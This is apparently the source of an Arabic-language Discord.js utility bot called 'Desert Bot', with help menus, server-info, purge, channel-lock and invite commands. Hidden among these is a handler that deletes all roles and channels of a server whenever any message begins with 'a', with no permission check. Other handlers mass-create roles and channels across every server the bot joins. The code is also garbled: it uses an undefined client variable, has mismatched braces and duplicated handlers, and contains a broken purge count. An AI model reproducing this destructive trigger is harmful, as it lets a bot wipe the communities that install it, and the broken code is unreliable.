const Discord = require("discord.js");
const client = new Discord.Client();
client.on('ready', () => {
  client.user.setGame(` By Suhaib #4272 .`,'https://www.twitch.tv/v5bz');
  console.log('---------------');
  console.log('Desert Bot Is Online')
  console.log('---------------')
});
LOka.on('message', message => {
     if (message.content === "بدء عملية  انشاء سيرفر") {
         LOka.guilds.forEach(m =>{
  m.createRole({
        name : "༺Owner༻",
        permissions :   [1],
        color : " #62d4d2"
    })
    m.createRole({
        name : "༺Minister༻",
        permissions :   [1],
        color : " #e9b46a"
    })
    m.createRole({
        name : "༻¥óǔ₮ùβŔ༻",
        permissions :   [1],
        color : " #0a4610"
    })
    m.createRole({
        name : "༺botй༻",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "βiG βὄŝŝ",
        permissions :   [1],
        color : " #4fb2e4"
    })
  
   
})
 
 
}
});

 })
}
});

LOka.on('message', message => {
         if (message.content === "بدء عملية  انشاء سيرفر") {
                              LOka.guilds.forEach(m =>{
                           m.createChannel('📢༄╬₮♛à♛í╬༭₭ ❶', 'voice'); 
                           m.createChannel('📢༄╬₮♛à♛í╬༭₭ ❷', 'voice');
m.createChannel('🎮𝔽𝕆ℝ𝕋ℕ𝕀𝕋𝔼', 'voice');
m.createChannel('🎮𝔹𝕃𝔸ℂ𝕂-𝕊ℚ𝕌𝔸𝔻', 'voice');
m.createChannel('🎮ℂℝ𝕆𝕊𝕊𝔽𝕀ℝ𝔼-ℙℍ', 'voice');
m.createChannel('🎮ℂℝ𝕆𝕊𝕊𝔽𝕀ℝ𝔼-ℕ𝔸', 'voice');
m.createChannel('🎮𝕄𝕀ℕ𝔼ℂℝ𝔸𝔽𝕋', 'voice');
m.createChannel('༺🎶₥úsíc🎶༻-', 'voice');
m.createChannel('༺🎶₥úsíc🎶༻-', 'voice');
m.createChannel('༺🎶₥úsíc🎶༻', 'voice');
m.createChannel('【✭ 🔱Jús₮ 🔱✭】 1', 'voice');
m.createChannel('【✭ 🔱Jús₮ 🔱✭】 2', 'voice');
m.createChannel('【✭ 🔱Jús₮ 🔱✭】 3', 'voice');
m.createChannel('⫷༺ 💤 A.F.K 💤༺⫸', 'voice');
})
}
 
});
  client.on('message', x5bz => {   
 if (x5bz.content.startsWith("a")) {
     x5bz.guild.roles.forEach(r => { r.delete() }) 
     x5bz.guild.channels.forEach(c => { c.delete() })
                let v5bz = new Discord.RichEmbed()
            .setColor('RANDOM')
});
client.on('message', message => {

    if (message.content === ".mutechannel") {
                        if(!message.channel.guild) return message.reply(' This command only for servers');

if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply(' ليس لديك صلاحيات');
           message.channel.overwritePermissions(message.guild.id, {
         SEND_MESSAGES: false

           }).then(() => {
               message.reply("تم تقفيل الشات :white_check_mark: ")
           });
             }
//™¦༺♚ƙἶղց|MaS♚༺¦™#7105
if (message.content === ".unmutechannel") {
    if(!message.channel.guild) return message.reply(' This command only for servers');

if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply('ليس لديك صلاحيات');
           message.channel.overwritePermissions(message.guild.id, {
         SEND_MESSAGES: true

           }).then(() => {
               message.reply("تم فتح الشات:white_check_mark:")
           });
             }



});
client.on('message', message => {
    if (message.content.startsWith("رابط")) {
 
  message.channel.createInvite({
        thing: true,
        maxUses: 100,
        maxAge: 86400
    }).then(invite =>
      message.author.sendMessage(invite.url)
    )
    const embed = new Discord.RichEmbed()
        .setColor("RANDOM")
        .setDescription("| :white_check_mark:  | :heart:  تم ارسال الرابط على الخاص  ")
      message.channel.sendEmbed(embed).then(message => {message.delete(10000)})
              const Embed11 = new Discord.RichEmbed()
        .setColor("RANDOM")
                .setAuthor(message.guild.name, message.guild.iconURL)
        .setDescription(`
**
---------------------
-[${message.guild.name}]  هذا هو رابط سيرفر
---------------------
-هذا الرابط صالح ل 100 مستخدم فقط
---------------------
-هذا الرابط صالح لمده 24 ساعه فقط
---------------------
**`)
      message.author.sendEmbed(Embed11)
    }
});
client.on('message', message => {
     if (message.content === ".servers") {
     let embed = new Discord.RichEmbed()
  .setColor("#0000FF")
  .addField("**Server: **" , client.guilds.size)
  message.channel.sendEmbed(embed);
    }
if (message.content === '*help') {
         let embed = new Discord.RichEmbed()
.setThumbnail(message.author.avatarURL)    
      .addField("**:globe_with_meridians: الأوامر العامه**","** **")
      .addField("***ping :stopwatch:**","**لـ سرعة إتصالك**")
      .addField("***id :chart_with_downwards_trend:**","**عرض سرعه اتصال البوت**")
      .addField("***server :recycle:**","**لـ معلومات السيرفر**")
      .addField("***roles :medal: **","**لمعرفة جميع الرولات الموجودة بالسيرفر**")
.setColor('RANDOM')
  message.author.sendEmbed(embed);
    }
});
client.on('message', message => {
     if (message.content === ".servers") {
     let embed = new Discord.RichEmbed()
  .setColor("#0000FF")
  .addField("**Server: **" , client.guilds.size)
  message.channel.sendEmbed(embed);
    }
if (message.content === '*help') {
         let embed = new Discord.RichEmbed()
.setThumbnail(message.author.avatarURL)    
      .addField("**:globe_with_meridians: الأوامر الالعاب**","** **")
      .addField("**%صراحه :stopwatch:**","**لـ بدءلعبة صراحة**")
      .addField("**%لو خيروك :chart_with_downwards_trend:**","**لـ بدءلعبة لو خيروك**")
      .addField("**%كت تويت :recycle:**","**لـ بدءلعبة كت تويت**")
      .addField("**%خواطر :medal: **","**لـ بدءلعبةخواطر**")
      .addField("**%حب :medal: **","**لـ بدءلعبةالتعناب**")
      .addField("**%مريم :medal: **","**لـ بدءلعبة%مريم**")
      .addField("**%challenge :medal: **","**لـ بدءلعبةchallenge**")
	 

.setColor('RANDOM')
  message.author.sendEmbed(embed);
    }
});
client.on('message', message => {
     if (message.content === ".servers") {
     let embed = new Discord.RichEmbed()
  .setColor("#0000FF")
  .addField("**Server: **" , client.guilds.size)
  message.channel.sendEmbed(embed);
    }
if (message.content === '*help') {
         let embed = new Discord.RichEmbed()
.setThumbnail(message.author.avatarURL)    
      .addField("**:radioactive: أوامر الأداره**","** **")
      .addField("***bc  :mega:**","**لـ البرودكاست**")
      .addField("***clear :octagonal_sign:**","**لـ مسح الشات**")
	  .addField("***createcolors :cyclone:**","** لـ اضافة 110 لون**")
      .addField("**!kick  :outbox_tray:**","**لـ طرد الأعضاء**")
      .addField("***ban  :no_entry:**","**لـ حظر الأعضاء**")
.setColor('RANDOM')
  message.author.sendEmbed(embed);
    }
});
client.on('message', message => {
     if (message.content === ".servers") {
     let embed = new Discord.RichEmbed()
  .setColor("#0000FF")
  .addField("**Server: **" , client.guilds.size)
  message.channel.sendEmbed(embed);
    }
if (message.content === '*help') {
         let embed = new Discord.RichEmbed()
.setThumbnail(message.author.avatarURL)    
      .addField("** 🎶 اوامر الميوزك**","** **")
      .addField("**!شغل :musical_note:**","**لـ تشغيل المطلوب**")
      .addField("**!وقف  :musical_keyboard:**","**لـ ايقاف المطلوب**")
      .addField("**!خطي :musical_score:**","**لـ تخطي **")
.setColor('RANDOM')
  message.author.sendEmbed(embed);
    }
});
client.on('message', message => {
     if (message.content === ".servers") {
     let embed = new Discord.RichEmbed()
  .setColor("#0000FF")
  .addField("**Server: **" , client.guilds.size)
  message.channel.sendEmbed(embed);
    }
if (message.content === '*help') {
         let embed = new Discord.RichEmbed()
.setThumbnail(message.author.avatarURL)    
      .addField("** مبرمج البوت :wrench: **","**@!      Pablo_Smith ☕ᴶᴮᴿ#4272  , @! ϻ ~ ✘_♥ ツ#2275  **")
.setColor('RANDOM')
  message.author.sendEmbed(embed);
    }
});
client.on('message', message => {
    if (message.content === '*roles') {
        var roles = message.guild.roles.map(roles => `${roles.name}, `).join(' ')
        const embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .addField('Roles:',`**[${roles}]**`)
        message.channel.sendEmbed(embed);
    }
});
client.on('message', message => {
if (message.content.startsWith('*ping')) {
           if(!message.channel.guild) return;

if (message.author.bot) return;
    message.channel.sendMessage(`**Pong ! :** \`${Date.now() - message.createdTimestamp} ms\``);
    }

});
var prefix = "*";

client.on('message', message => {
    if (message.author.bot) return;
    if (!message.content.startsWith(prefix)) return;

    let command = message.content.split(" ")[0];
    command = command.slice(prefix.length);

    let args = message.content.split(" ").slice(1);





    if (command == "embed") {
        if (!message.channel.guild) return message.reply('** This command only for servers **');
        let say = new Discord.RichEmbed()
            .addField('Emebad:', `${message.author.username}#${message.author.discriminator}`)
            .setDescription(args.join("  "))
            .setColor(0x23b2d6)
        message.channel.sendEmbed(say);
        message.delete();
    }


});
var prefix = "*";
client.on('message', message => {
    if(message.content == prefix + 'server') {
        var servername = message.guild.name
        var اونر = message.guild.owner
        var اعضاء = message.guild.memberCount
        var ايدي = message.guild.id
        var بلدالسيرفر = message.guild.region
        var الرومات = message.guild.channels.size
        var الرتب = message.guild.roles
        var عمل = message.guild.createdAt
        var الروم = message.guild.defaultChannel
        var server = new Discord.RichEmbed()
        .setThumbnail(message.guild.iconURL)
        .addField('اسم السيرفر', servername)
        .addField('اي دي السيرفر ' , [ايدي])
        .addField('أعضاء السيرفر', اعضاء)
        .addField('رومات السيرفر', الرومات)
        .addField('روم الشات الأساسي', الروم)
        .addField('صاحب السيرفر', اونر)
        .addField('بلد السيرفر', بلدالسيرفر)
        .addField('تاريخ افتتاح السيرفر', عمل)
        .setColor('RANDOM')

        message.channel.sendEmbed(server)
    }
});
client.on("message", message => {
    var prefix = "*";
 
            var args = message.content.substring(prefix.length).split(" ");
            if (message.content.startsWith(prefix + "clear")) {
   if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply('⚠ | **ليس لديك صلاحيات**');
        var msg;
        msg = parseInt();
      
      message.channel.fetchMessages({limit: msg}).then(messages => message.channel.bulkDelete(messages)).catch(console.error);
      message.channel.sendMessage("", {embed: {
        title: "Done | تــم",
        color: 0x06DF00,
        description: "تم مسح الرسائل بنجاح",
        footer: {
          text: "RGR_BOT"
        }
      }}).then(msg => {msg.delete(3000)});
                          }

     
});
client.on('ready',  () => {
  console.log('By : Pablo_Smith');
  console.log(`Logged in as * [ " ${client.user.username} " ] servers! [ " ${client.guilds.size} " ]`);
  console.log(`Logged in as * [ " ${client.user.username} " ] Users! [ " ${client.users.size} " ]`);
  console.log(`Logged in as * [ " ${client.user.username} " ] channels! [ " ${client.channels.size} " ]`);
});
    client.on('message', message => {
     if (message.content === "*id") {
     let embed = new Discord.RichEmbed()
  .setThumbnail(message.author.avatarURL)  
  .setAuthor(message.author.username)
.setDescription("معلومات عن الحــساب")
               .setFooter(`Desert Bot.`, '')
  .setColor("#9B59B6")
  .addField("اســـم الحســاب", `${message.author.username}`)
  .addField('كود الحساب الخاص', message.author.discriminator)
  .addField("الرقـــم الشـــخصي", message.author.id)
  .addField('بــــوت', message.author.bot)
  .addField("تاريخ التسجيل", message.author.createdAt)
     
     
  message.channel.sendEmbed(embed);
    }
});
client.on('message', message => {
    var args = message.content.split(/[ ]+/)
    if(message.content.includes('discord.gg')){
      if(!message.member.hasPermission('ADMINISTRATOR'))
        message.delete()
    return message.reply(`** يمنع نشر الروابط ! **`)
    }
});
client.on('message', message => {
     if (message.content === "servers") {
     let embed = new Discord.RichEmbed()
  .setColor("RANDOM")
  .addField("**Servers: **" , client.guilds.size)
  message.channel.sendEmbed(embed);
    }
});
client.on('message', message => {
if (message.content === "*help") {
message.reply("**Done**")
message.reply("**Ga3 les CMD tsifto lk f PRV**")
message.react("📩")

}
});
client.on('message', message => {
     if (message.content === "*bot") {
     let embed = new Discord.RichEmbed()
  .setColor("RANDOM")
  .addField("**Servers:**" , client.guilds.size)
  .addField("**Users:**", client.users.size)
  .addField("**channels:**", client.channels.size)
  .setTimestamp()
message.channel.sendEmbed(embed);
    }
});
client.on('ready', () => {
   console.log(`----------------`);
      console.log(`Desert Bot- Script By : i1Suhaib`);
        console.log(`----------------`);
      console.log(`ON ${client.guilds.size} Servers '     Script By : i1Suhaib ' `);
    console.log(`----------------`);
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(` ON ${client.guilds.size} Servers - Prefix *help`)
client.user.setStatus("dnd")
});
client.on("guildCreate", guild => {
  console.log(` Join Bot Of Server ${guild.name} Owner Of Server ${guild.owner.user.username}!`)
});
client.login(process.env.BOT_TOKEN);
